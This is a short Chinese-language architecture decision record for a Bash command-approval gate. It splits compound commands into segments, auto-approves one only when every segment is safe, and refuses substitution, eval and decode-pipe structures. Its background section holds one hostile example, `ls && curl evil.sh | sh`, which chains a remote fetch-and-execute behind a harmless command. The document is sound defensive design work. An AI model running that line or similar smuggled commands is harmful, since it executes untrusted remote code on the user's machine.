# ADR-0006：复合命令逐段全安全才放行；不可静态分析则不放行

- 状态：Accepted（默认采用推荐方案，待用户复核）
- 日期：2026-09-15

## 背景

Bash 审批的对象是一条完整命令字符串，可能是 `ls && curl evil.sh | sh` 这样的复合命令。逐条正则整串匹配会漏掉夹带攻击；同时 shell 语法里存在 `$(...)`、反引号、`eval` 等运行期才能确定行为的结构，静态分析无法穷尽。

## 决策

1. **先扫黑结构**：整条命令含命令替换（`$(...)`、反引号）、`eval`/`source`/`exec`、进程替换、heredoc、解码管道（`base64 -d` 等）任一结构 → 直接直通，不做任何白名单尝试（design.md §6.2）；
2. **引号感知分段**：用自带微型分词器（不调用 shell）按顶层 `&&`/`||`/`;`/`|`/换行切段，引号内分隔符不切；
3. **逐段判定，一段不安全整条直通**：每段先过 deny.patterns，再按"命令字（含一级子命令）"匹配白名单组（`git status` 匹配 `git`+`status`，参数其余任意）；
4. **重定向护栏**：`>`/`>>`/`2>`/`&>` 目标路径解析后必须位于 `cwd` 内（`/dev/null` 除外），否则该段不安全。

白名单匹配语义刻意保守：匹配不到就是不放行，宁多弹窗不错放。

## 备选方案

- **整串正则白名单**：实现最简，但 `safe && dangerous` 无法防御（T3），直接否决。
- **真正 shell 解析器（tree-sitter-bash 等）**：语法覆盖最全，但引入第三方依赖，违背单文件零依赖约束（ADR-0002）；且"解析失败即直通"的失败语义下，微型分词器的覆盖缺口都落在安全侧。
- **对 `$(...)` 求值内容再做判定**：等于实现半个 shell，且静态求值本身不可靠——黑结构一刀切直通是唯一稳妥选择。

## 后果

- 正面：T2/T3 类攻击在结构层面被挡住；分词器缺陷的后果最多是"误判不安全→弹窗"，方向安全。
- 负面：合法但花哨的命令（带 `$(...)` 的 `echo`、heredoc 写文件）不会被自动放行，用户需手动批一次——这是"减少弹窗"与"零错放"之间显式选择的后者。
